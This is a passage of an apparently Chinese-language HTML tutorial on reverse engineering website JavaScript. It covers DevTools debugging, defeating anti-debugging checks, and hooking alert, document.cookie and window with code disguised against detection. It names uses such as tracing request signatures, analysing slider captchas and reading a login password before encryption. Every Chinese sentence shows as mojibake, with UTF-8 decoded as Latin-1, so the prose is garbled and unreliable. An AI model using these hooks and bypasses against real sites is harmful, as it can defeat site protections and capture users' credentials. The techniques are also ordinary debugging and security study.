      <p>æ–­ç‚¹åœä¸‹åï¼Œå³ä¾§ Call Stack é¢æ¿æ˜¾ç¤ºå‡½æ•°è°ƒç”¨é“¾ï¼š</p>

      <pre><code>generateRequest (main.js:123)
  |- getData (utils.js:45)
       |- onClick (app.js:789)
            |- &lt;anonymous&gt;
</code></pre>

      <h3 id="ä½¿ç”¨æŠ€å·§-2">ä½¿ç”¨æŠ€å·§</h3>

      <ol>
        <li><strong>ä»ä¸‹å¾€ä¸Šçœ‹</strong>: æœ€ä¸‹é¢æ˜¯äº‹ä»¶å…¥å£ï¼Œæœ€ä¸Šé¢æ˜¯å½“å‰ä½ç½®</li>
        <li><strong>ç‚¹å‡»è·³è½¬</strong>: ç‚¹å‡»ä»»æ„ä¸€å±‚å¯ä»¥æŸ¥çœ‹è¯¥å±‚çš„ä»£ç å’Œå˜é‡</li>
        <li><strong>è¿‡æ»¤åº“æ–‡ä»¶</strong>: å³é”® -> Blackbox scriptï¼Œéšè—ç¬¬ä¸‰æ–¹åº“</li>
      </ol>

      <hr />

      <h2 id="scope-å˜é‡æŸ¥çœ‹">Scope å˜é‡æŸ¥çœ‹</h2>

      <h3 id="ä½œç”¨åŸŸç±»å‹">ä½œç”¨åŸŸç±»å‹</h3>

      <ul>
        <li><strong>Local</strong>: å½“å‰å‡½æ•°çš„å±€éƒ¨å˜é‡</li>
        <li><strong>Closure</strong>: é—­åŒ…å˜é‡</li>
        <li><strong>Global</strong>: å…¨å±€å˜é‡</li>
      </ul>

      <h3 id="æŠ€å·§">æŠ€å·§</h3>

      <p><strong>æŸ¥çœ‹å¤æ‚å¯¹è±¡</strong>:</p>

      <ul>
        <li>å³é”® -> Store as global variable</li>
        <li>åœ¨ Console ä¸­æ“ä½œè¯¥å˜é‡ï¼ˆä¼šè‡ªåŠ¨å‘½åä¸º <code>temp1</code>, <code>temp2</code>&#8230;ï¼‰</li>
      </ul>

      <p><strong>ä¿®æ”¹å˜é‡</strong>:</p>

      <ul>
        <li>åŒå‡»å˜é‡å€¼å¯ä»¥ç›´æ¥ä¿®æ”¹</li>
        <li>ç”¨äºæµ‹è¯•ä¸åŒå‚æ•°çš„å½±å“</li>
      </ul>

      <hr />

      <h2 id="console-è°ƒè¯•æŠ€å·§">Console è°ƒè¯•æŠ€å·§</h2>

      <h3 id="æ¡ä»¶è¾“å‡º">æ¡ä»¶è¾“å‡º</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åªæœ‰å½“æ¡ä»¶æ»¡è¶³æ—¶æ‰è¾“å‡º</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">user_id</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">12345</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Target user:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">user_id</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="åˆ†ç»„è¾“å‡º">åˆ†ç»„è¾“å‡º</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">console</span><span class="p">.</span><span class="nx">group</span><span class="p">(</span><span class="s1">&#39;User Info&#39;</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ID:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">user_id</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Name:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">username</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">groupEnd</span><span class="p">();</span>
</code></pre>
      </div>

      <h3 id="è¡¨æ ¼è¾“å‡º">è¡¨æ ¼è¾“å‡º</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">users</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
<span class="w">    </span><span class="p">{</span><span class="nx">id</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;Alice&#39;</span><span class="p">},</span>
<span class="w">    </span><span class="p">{</span><span class="nx">id</span><span class="o">:</span><span class="w"> </span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;Bob&#39;</span><span class="p">}</span>
<span class="p">];</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">table</span><span class="p">(</span><span class="nx">users</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="æ€§èƒ½æµ‹é‡">æ€§èƒ½æµ‹é‡</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">console</span><span class="p">.</span><span class="nx">time</span><span class="p">(</span><span class="s1">&#39;encrypt&#39;</span><span class="p">);</span>
<span class="c1">// ... åŠ å¯†ä»£ç </span>
<span class="nx">console</span><span class="p">.</span><span class="nx">timeEnd</span><span class="p">(</span><span class="s1">&#39;encrypt&#39;</span><span class="p">);</span><span class="w">  </span><span class="c1">// encrypt: 12.345ms</span>
</code></pre>
      </div>

      <h3 id="å †æ ˆè¿½è¸ª">å †æ ˆè¿½è¸ª</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">(</span><span class="s1">&#39;Where am I?&#39;</span><span class="p">);</span>
</code></pre>
      </div>

      <hr />

      <h2 id="é«˜çº§è°ƒè¯•æŠ€å·§">é«˜çº§è°ƒè¯•æŠ€å·§</h2>

      <h3 id="1-blackbox-ç¬¬ä¸‰æ–¹åº“">1. Blackbox ç¬¬ä¸‰æ–¹åº“</h3>

      <p>é¿å…è°ƒè¯•æ—¶è¿›å…¥ jQueryã€React ç­‰ç¬¬ä¸‰æ–¹åº“ï¼š</p>

      <p><strong>æ–¹æ³•ä¸€</strong>:</p>

      <ol>
        <li>Settings -> Blackboxing</li>
        <li>æ·»åŠ æ¨¡å¼ï¼š<code>/node_modules/</code>, <code>/jquery.*.js</code></li>
      </ol>

      <p><strong>æ–¹æ³•äºŒ</strong>:</p>

      <ul>
        <li>åœ¨ Call Stack ä¸­å³é”® -> Blackbox script</li>
      </ul>

      <h3 id="2-å¼‚æ­¥ä»£ç è°ƒè¯•">2. å¼‚æ­¥ä»£ç è°ƒè¯•</h3>

      <p><strong>é—®é¢˜</strong>: å¼‚æ­¥ä»£ç æ–­ç‚¹åï¼ŒCall Stack æ–­è£‚ã€‚</p>

      <p><strong>è§£å†³</strong>: å‹¾é€‰ &#8220;Async&#8221; æŒ‰é’®ï¼ˆCall Stack ä¸Šæ–¹ï¼‰ï¼Œæ˜¾ç¤ºå®Œæ•´å¼‚æ­¥è°ƒç”¨æ ˆã€‚</p>

      <h3 id="3-source-map">3. Source Map</h3>

      <p><strong>é—®é¢˜</strong>: ç”Ÿäº§ç¯å¢ƒä»£ç è¢«å‹ç¼©/æ··æ·†ï¼Œæ— æ³•è°ƒè¯•ã€‚</p>

      <p><strong>è§£å†³</strong>: å¦‚æœæœ‰ Source Map æ–‡ä»¶ï¼ˆ<code>.map</code>ï¼‰ï¼ŒDevTools ä¼šè‡ªåŠ¨åŠ è½½åŸå§‹ä»£ç ã€‚</p>

      <h3 id="4-local-overrides-æœ¬åœ°æ›¿æ¢">4. Local Overrides (æœ¬åœ°æ›¿æ¢)</h3>

      <p><strong>ç”¨é€”</strong>: ä¿®æ”¹çº¿ä¸Š JS æ–‡ä»¶å¹¶ä¿å­˜ï¼Œåˆ·æ–°åä¾ç„¶ç”Ÿæ•ˆã€‚</p>

      <p><strong>æ­¥éª¤</strong>:</p>

      <ol>
        <li>Sources -> Overrides</li>
        <li>é€‰æ‹©æœ¬åœ°æ–‡ä»¶å¤¹</li>
        <li>ä¿®æ”¹æ–‡ä»¶å¹¶ä¿å­˜ (<code>Ctrl+S</code>)</li>
      </ol>

      <p><strong>åº”ç”¨</strong>:</p>

      <ul>
        <li>åˆ é™¤åè°ƒè¯•ä»£ç </li>
        <li>æ·»åŠ æ—¥å¿—è¾“å‡º</li>
        <li>ä¿®æ”¹åŠ å¯†é€»è¾‘æµ‹è¯•</li>
      </ul>

      <h3 id="5-snippets-ä»£ç ç‰‡æ®µ">5. Snippets (ä»£ç ç‰‡æ®µ)</h3>

      <p><strong>ç”¨é€”</strong>: ä¿å­˜å¸¸ç”¨çš„ Hook è„šæœ¬ï¼Œå¿«é€Ÿæ‰§è¡Œã€‚</p>

      <p><strong>æ­¥éª¤</strong>:</p>

      <ol>
        <li>Sources -> Snippets</li>
        <li>æ–°å»º Snippet</li>
        <li>ç²˜è´´è„šæœ¬ï¼Œ<code>Ctrl+Enter</code> æ‰§è¡Œ</li>
      </ol>

      <hr />

      <h2 id="åè°ƒè¯•å¯¹æŠ—">åè°ƒè¯•å¯¹æŠ—</h2>

      <h3 id="1-æ— é™-debugger">1. æ— é™ debugger</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">setInterval</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">debugger</span><span class="p">;</span>
<span class="p">},</span><span class="w"> </span><span class="mf">100</span><span class="p">);</span>
</code></pre>
      </div>

      <p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>

      <ul>
        <li><strong>æ–¹æ³•ä¸€</strong>: å³é”®æ–­ç‚¹è¡Œ -> &#8220;Never pause here&#8221;</li>
        <li><strong>æ–¹æ³•äºŒ</strong>: Hook <code>Function.prototype.constructor</code> (è§ <a
            href="#07-Scripts-javascript-hook-scripts">Hook è„šæœ¬</a>)</li>
        <li><strong>æ–¹æ³•ä¸‰</strong>: Local Overrides åˆ é™¤è¯¥æ®µä»£ç </li>
      </ul>

      <h3 id="2-æ£€æµ‹-devtools-æ‰“å¼€">2. æ£€æµ‹ DevTools æ‰“å¼€</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">setInterval</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">outerWidth</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">innerWidth</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">160</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;DevTools detected!&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;about:blank&#39;</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">},</span><span class="w"> </span><span class="mf">1000</span><span class="p">);</span>
</code></pre>
      </div>

      <p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>

      <ul>
        <li>ä½¿ç”¨ç‹¬ç«‹çª—å£æ¨¡å¼ï¼ˆUndock into separate windowï¼‰</li>
        <li>Hook <code>window.outerWidth</code> å’Œ <code>window.innerWidth</code></li>
      </ul>

      <h3 id="3-æ£€æµ‹æ—¶é—´å·®">3. æ£€æµ‹æ—¶é—´å·®</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
<span class="k">debugger</span><span class="p">;</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">end</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">end</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">100</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Debugger detected!&#39;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>

      <ul>
        <li>Hook <code>Date.now()</code> è¿”å›å›ºå®šå¢é‡</li>
      </ul>

      <hr />

      <h2 id="å®æˆ˜ç¤ºä¾‹">å®æˆ˜ç¤ºä¾‹</h2>

      <h3 id="ç¤ºä¾‹ä¸€è¿½è¸ªåŠ å¯†å‡½æ•°">ç¤ºä¾‹ä¸€ï¼šè¿½è¸ªåŠ å¯†å‡½æ•°</h3>

      <p><strong>ç›®æ ‡</strong>: æ‰¾åˆ°ç”Ÿæˆ <code>sign</code> å‚æ•°çš„å‡½æ•°</p>

      <p><strong>æ­¥éª¤</strong>:</p>

      <ol>
        <li>Network é¢æ¿æ‰¾åˆ°åŒ…å« <code>sign</code> çš„è¯·æ±‚</li>
        <li>å…¨å±€æœç´¢ <code>sign</code>ï¼ˆå¯èƒ½æœ‰ä¸Šç™¾ä¸ªç»“æœï¼‰</li>
        <li>è®¾ç½® XHR æ–­ç‚¹ï¼ŒURL å¡« <code>/api/</code></li>
        <li>åˆ·æ–°é¡µé¢ï¼Œæ–­ç‚¹åœä¸‹</li>
        <li>æŸ¥çœ‹ Call Stackï¼Œå®šä½åˆ° <code>generateSign</code> å‡½æ•°</li>
        <li>å•æ­¥è°ƒè¯•ï¼Œç†è§£åŠ å¯†é€»è¾‘</li>
      </ol>

      <h3 id="ç¤ºä¾‹äºŒç»•è¿‡æ»‘å—éªŒè¯ç ">ç¤ºä¾‹äºŒï¼šç»•è¿‡æ»‘å—éªŒè¯ç </h3>

      <p><strong>ç›®æ ‡</strong>: åˆ†ææ»‘å—éªŒè¯é€»è¾‘</p>

      <p><strong>æ­¥éª¤</strong>:</p>

      <ol>
        <li>å³é”®æ»‘å—å…ƒç´  -> Break on -> Attribute modifications</li>
        <li>æ‹–åŠ¨æ»‘å—ï¼Œæ–­ç‚¹åœä¸‹</li>
        <li>æŸ¥çœ‹ Call Stackï¼Œæ‰¾åˆ°éªŒè¯å‡½æ•°</li>
        <li>åˆ†æè½¨è¿¹ç”Ÿæˆå’ŒéªŒè¯é€»è¾‘</li>
      </ol>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#07-Scripts-javascript-hook-scripts">JavaScript Hook è„šæœ¬</a></li>
        <li><a href="#02-Tooling-browser-devtools">æµè§ˆå™¨å¼€å‘è€…å·¥å…·</a></li>
        <li><a href="#03-Basic-Recipes-re-workflow">é€†å‘å·¥ç¨‹å·¥ä½œæµ</a></li>
      </ul>

    </div>

    <div class="section" id="03-Basic-Recipes-hooking-techniques">
      <h2>27. Hooking Techniques</h2>
      <h1 id="hook-æŒ‚é’©åŠ«æŒ-æŠ€æœ¯">Hook (æŒ‚é’©/åŠ«æŒ) æŠ€æœ¯</h1>

      <p>æŒæ¡ JavaScript Hook æŠ€æœ¯ï¼Œæ‹¦æˆªå’Œä¿®æ”¹å‡½æ•°è°ƒç”¨ï¼Œæ— éœ€ç ´è§£å³å¯è·å–å…³é”®æ•°æ®ã€‚</p>

      <hr />

      <h2 id="é…æ–¹ä¿¡æ¯">ğŸ“Š é…æ–¹ä¿¡æ¯</h2>

      <table>
        <thead>
          <tr>
            <th>é¡¹ç›®</th>
            <th>è¯´æ˜</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>éš¾åº¦</strong></td>
            <td>â­â­ (åˆçº§-ä¸­çº§)</td>
          </tr>
          <tr>
            <td><strong>é¢„è®¡æ—¶é—´</strong></td>
            <td>30 åˆ†é’Ÿ - 2 å°æ—¶</td>
          </tr>
          <tr>
            <td><strong>æ‰€éœ€å·¥å…·</strong></td>
            <td>Chrome DevTools, Tampermonkey (å¯é€‰)</td>
          </tr>
          <tr>
            <td><strong>é€‚ç”¨åœºæ™¯</strong></td>
            <td>å‡½æ•°æ‹¦æˆªã€å‚æ•°ç›‘æ§ã€è¿”å›å€¼ä¿®æ”¹ã€åè°ƒè¯•ç»•è¿‡</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="å­¦ä¹ ç›®æ ‡">ğŸ¯ å­¦ä¹ ç›®æ ‡</h2>

      <p>å®Œæˆæœ¬é…æ–¹åï¼Œä½ å°†èƒ½å¤Ÿï¼š</p>

      <ul>
        <li>âœ… ç†è§£ Hook æŠ€æœ¯çš„æ ¸å¿ƒåŸç†</li>
        <li>âœ… ä½¿ç”¨è¦†ç›–æ³• Hook å…¨å±€å‡½æ•°</li>
        <li>âœ… ä½¿ç”¨ Object.defineProperty Hook å±æ€§</li>
        <li>âœ… ä½¿ç”¨ Proxy å®ç°æ·±åº¦æ‹¦æˆª</li>
        <li>âœ… Hook å¸¸è§ Web API (fetch, XHR, crypto)</li>
        <li>âœ… ç¼–å†™é˜²æ£€æµ‹çš„ Hook ä»£ç </li>
      </ul>

      <hr />

      <h2 id="æ€è€ƒæ—¶åˆ»">ğŸ’­ æ€è€ƒæ—¶åˆ»</h2>

      <p>åœ¨å¼€å§‹å­¦ä¹  Hook æŠ€æœ¯ä¹‹å‰ï¼Œå…ˆæ€è€ƒå‡ ä¸ªé—®é¢˜ï¼š</p>

      <ol>
        <li><strong>ä½ æ‰“è¿‡ç”µè¯çªƒå¬çš„æ¯”å–»å—ï¼Ÿ</strong> Hook æŠ€æœ¯å’Œç”µè¯çªƒå¬æœ‰ä»€ä¹ˆç›¸ä¼¼ä¹‹å¤„ï¼Ÿ</li>
        <li><strong>å¦‚æœå‡½æ•°æ˜¯ä¸€ä¸ªé»‘ç›’</strong>ï¼Œä½ æ— æ³•çœ‹åˆ°å®ƒçš„æºç ï¼Œæ€ä¹ˆçŸ¥é“å®ƒåœ¨åšä»€ä¹ˆï¼Ÿ</li>
        <li><strong>ä¿®æ”¹å‡½æ•°ä¼šç ´ååŸæœ‰åŠŸèƒ½å—ï¼Ÿ</strong> å¦‚ä½•åœ¨ä¸å½±å“ä¸šåŠ¡çš„å‰æä¸‹"å·å¬"ï¼Ÿ</li>
        <li><strong>å®é™…åœºæ™¯ï¼š</strong> ä¸€ä¸ªç½‘ç«™çš„ç™»å½•æ¥å£å‘é€äº†åŠ å¯†å¯†ç ï¼Œä½ å¦‚ä½•åœ¨ä¸ç ´è§£åŠ å¯†ç®—æ³•çš„æƒ…å†µä¸‹ï¼Œæ‹¿åˆ°åŠ å¯†å‰çš„æ˜æ–‡ï¼Ÿ</li>
      </ol>

      <p>è¿™äº›é—®é¢˜çš„ç­”æ¡ˆï¼Œå°±æ˜¯ Hook æŠ€æœ¯çš„ç²¾é«“ã€‚</p>

      <hr />

      <h2 id="æ ¸å¿ƒæ¦‚å¿µ">ğŸ’¡ æ ¸å¿ƒæ¦‚å¿µ</h2>

      <p>Hookï¼ˆæŒ‚é’©/åŠ«æŒï¼‰æŠ€æœ¯æ˜¯ JS é€†å‘çš„çµé­‚ã€‚æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š<strong>ä¿®æ”¹åŸå‡½æ•°çš„å®šä¹‰ï¼Œæ’å…¥æˆ‘ä»¬çš„é€»è¾‘ï¼Œå†æ‰§è¡ŒåŸå‡½æ•°</strong>ã€‚è¿™å…è®¸æˆ‘ä»¬åƒä¸­é—´äººä¸€æ ·ï¼Œåœ¨ä¸ç ´åä¸šåŠ¡é€»è¾‘çš„å‰æä¸‹ï¼ŒæŸ¥çœ‹å’Œä¿®æ”¹å‚æ•°ã€è¿”å›å€¼ã€‚
      </p>

      <p><strong>Hook çš„æœ¬è´¨</strong>:</p>

      <pre><code>åŸæµç¨‹: è°ƒç”¨è€… â†’ å‡½æ•° â†’ è¿”å›å€¼
Hookå: è°ƒç”¨è€… â†’ æˆ‘ä»¬çš„ä»£ç  â†’ åŸå‡½æ•° â†’ æˆ‘ä»¬çš„ä»£ç  â†’ è¿”å›å€¼
</code></pre>

      <hr />

      <h2 id="1-åŸºç¡€-hook-è¦†ç›–æ³•">1. åŸºç¡€ Hook (è¦†ç›–æ³•)</h2>

      <p>æœ€ç®€å•ç²—æš´çš„æ–¹æ³•ï¼Œç›´æ¥æŠŠå‡½æ•°è¦†ç›–æ‰ã€‚</p>

      <h3 id="ç¤ºä¾‹-hook-alert">ç¤ºä¾‹: Hook <code>alert</code></h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nx">_alert</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">alert</span><span class="p">;</span><span class="w"> </span><span class="c1">// 1. ä¿å­˜åŸå‡½æ•°</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">alert</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">msg</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="c1">// 2. è¦†ç›–ä¸ºæ–°å‡½æ•°</span>
<span class="w">  </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[Hook] Alert called with:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">);</span><span class="w"> </span><span class="c1">// 3. æ’å…¥é€»è¾‘</span>
<span class="w">  </span><span class="k">debugger</span><span class="p">;</span><span class="w"> </span><span class="c1">// æ–¹ä¾¿è°ƒè¯•æ–­ä¸‹</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">_alert</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span><span class="w"> </span><span class="c1">// 4. è°ƒç”¨ï¼ˆåŠ«æŒï¼‰åŸå‡½æ•°</span>
<span class="p">};</span>
<span class="c1">// 5. ä¼ªè£… toString (å¯é€‰ï¼Œé˜²æ­¢è¢«æ£€æµ‹)</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">alert</span><span class="p">.</span><span class="nx">toString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="s2">&quot;function alert() { [native code] }&quot;</span><span class="p">;</span>
<span class="p">};</span>
</code></pre>
      </div>

      <hr />

      <h2 id="2-objectdefineproperty-å±æ€§-hook">2. Object.defineProperty (å±æ€§ Hook)</h2>

      <p>å½“æŸäº›å˜é‡æ˜¯ç›´æ¥èµ‹å€¼è€Œä¸æ˜¯å‡½æ•°è°ƒç”¨æ—¶ï¼ˆä¾‹å¦‚ <code>document.cookie = "xxx"</code>ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦ Hook å±æ€§ã€‚</p>

      <h3 id="ç¤ºä¾‹-hook-cookie">ç¤ºä¾‹: Hook <code>cookie</code></h3>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="nx">cookieCache</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
<span class="w">  </span><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nb">document</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;cookie&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">get</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="nx">cookieCache</span><span class="p">;</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nx">set</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">val</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[Hook] Setting cookie:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">val</span><span class="p">);</span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">val</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&quot;token&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">debugger</span><span class="p">;</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">      </span><span class="nx">cookieCache</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">val</span><span class="p">;</span><span class="w"> </span><span class="c1">// å®é™…ä¸Šè¿™é‡Œåº”è¯¥è°ƒç”¨åŸç”Ÿçš„ setterï¼Œæ¯”è¾ƒå¤æ‚ï¼Œé€šå¸¸ç”¨ Proxy ä»£æ›¿</span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="nx">val</span><span class="p">;</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">  </span><span class="p">});</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <hr />

      <h2 id="3-es6-proxy-ä»£ç†-hook">3. ES6 Proxy (ä»£ç† Hook)</h2>

      <p>Proxy æ˜¯æœ€å¼ºå¤§çš„ Hook æ–¹å¼ï¼Œå®ƒå¯ä»¥ä»£ç†æ•´ä¸ªå¯¹è±¡çš„æ‰€æœ‰æ“ä½œï¼ˆè¯»ã€å†™ã€å‡½æ•°è°ƒç”¨ã€éå†ç­‰ï¼‰ã€‚</p>

      <h3 id="ç¤ºä¾‹-ä»£ç†å…¨å±€å¯¹è±¡-window">ç¤ºä¾‹: ä»£ç†å…¨å±€å¯¹è±¡ window</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="nb">window</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Proxy</span><span class="p">(</span><span class="nb">window</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">get</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">prop</span><span class="p">,</span><span class="w"> </span><span class="nx">receiver</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">prop</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s2">&quot;v_account&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[Hook] Reading v_account&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">Reflect</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">prop</span><span class="p">,</span><span class="w"> </span><span class="nx">receiver</span><span class="p">);</span>
<span class="w">  </span><span class="p">},</span>
<span class="w">  </span><span class="nx">set</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">prop</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="nx">receiver</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">prop</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s2">&quot;v_account&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[Hook] Setting v_account =&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="p">);</span>
<span class="w">      </span><span class="k">debugger</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">Reflect</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">prop</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="nx">receiver</span><span class="p">);</span>
<span class="w">  </span><span class="p">},</span>
<span class="p">});</span>
</code></pre>
      </div>

      <p>_æ³¨æ„ï¼šç›´æ¥ä»£ç† window å¯èƒ½ä¼šæ¯”è¾ƒå¡ï¼Œä¸”å®¹æ˜“è¢«æ£€æµ‹ã€‚é€šå¸¸åªä»£ç†ç‰¹å®šçš„é…ç½®å¯¹è±¡ã€‚_</p>

      <hr />

      <h2 id="4-å¸¸è§-hook-ç‚¹">4. å¸¸è§ Hook ç‚¹</h2>

